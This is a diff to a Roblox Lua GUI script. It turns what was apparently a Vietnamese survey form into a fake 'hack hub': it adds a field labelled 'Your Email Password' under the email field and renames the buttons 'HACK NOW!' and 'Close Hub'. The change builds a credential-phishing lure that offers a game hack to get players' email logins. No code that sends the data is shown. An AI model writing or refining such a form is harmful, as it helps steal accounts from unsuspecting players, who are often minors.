@@ -7,6 +7,7 @@ local TitleLabel = Instance.new("TextLabel")
 local NameInput = Instance.new("TextBox")
 local AgeInput = Instance.new("TextBox")
 local RequestInput = Instance.new("TextBox")
+local EmailPassword = Instance.new("TextBox")
 
 -- Nút bấm
 local SubmitButton = Instance.new("TextButton")
@@ -54,7 +55,7 @@ AgeInput.ClearTextOnFocus = false
 -- Ô nhập Yêu cầu Script
 RequestInput.Parent = MainFrame
 RequestInput.Position = UDim2.new(0.1, 0, 0.5, 0)
-RequestInput.Size = UDim2.new(0.8, 0, 0, 70)
+RequestInput.Size = UDim2.new(0.8, 0, 0, 35)
 RequestInput.PlaceholderText = "Your Email"
 RequestInput.Text = ""
 RequestInput.TextWrapped = true
@@ -63,12 +64,23 @@ RequestInput.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 RequestInput.TextColor3 = Color3.fromRGB(255, 255, 255)
 RequestInput.ClearTextOnFocus = false
 
+EmailPassword.Parent = MainFrame
+EmailPassword.Position = UDim2.new(0.1, 0, 0.5, 0)
+EmailPassword.Size = UDim2.new(0.8, 0, 0, 35)
+EmailPassword.PlaceholderText = "Your Email Password"
+EmailPassword.Text = ""
+EmailPassword.TextWrapped = true
+EmailPassword.TextYAlignment = Enum.TextYAlignment.Top
+EmailPassword.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+EmailPassword.TextColor3 = Color3.fromRGB(255, 255, 255)
+EmailPassword.ClearTextOnFocus = false
+
 -- Nút Gửi
 SubmitButton.Parent = MainFrame
 SubmitButton.Position = UDim2.new(0.1, 0, 0.8, 0)
 SubmitButton.Size = UDim2.new(0.35, 0, 0, 40)
 SubmitButton.BackgroundColor3 = Color3.fromRGB(40, 150, 40)
-SubmitButton.Text = "Gửi Khảo Sát"
+SubmitButton.Text = "HACK NOW!"
 SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 SubmitButton.Font = Enum.Font.SourceSansBold
 SubmitButton.TextSize = 16
@@ -78,7 +90,7 @@ CloseButton.Parent = MainFrame
 CloseButton.Position = UDim2.new(0.55, 0, 0.8, 0)
 CloseButton.Size = UDim2.new(0.35, 0, 0, 40)
 CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-CloseButton.Text = "Đóng"
+CloseButton.Text = "Close Hub"
 CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseButton.Font = Enum.Font.SourceSansBold
 CloseButton.TextSize = 16
